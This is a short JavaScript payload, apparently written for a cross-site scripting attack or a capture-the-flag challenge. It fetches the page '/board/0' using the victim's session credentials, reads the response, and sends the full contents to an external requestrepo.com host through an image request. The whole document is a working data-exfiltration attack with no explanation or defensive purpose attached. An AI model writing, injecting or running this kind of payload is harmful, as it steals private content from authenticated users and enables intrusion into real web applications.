(async () => {
  const r = await fetch("/board/0", { credentials: "include" });
  const text = await r.text();

  new Image().src =
    "http://4w8vxje0.requestrepo.com/?body=" + encodeURIComponent(text);
})();
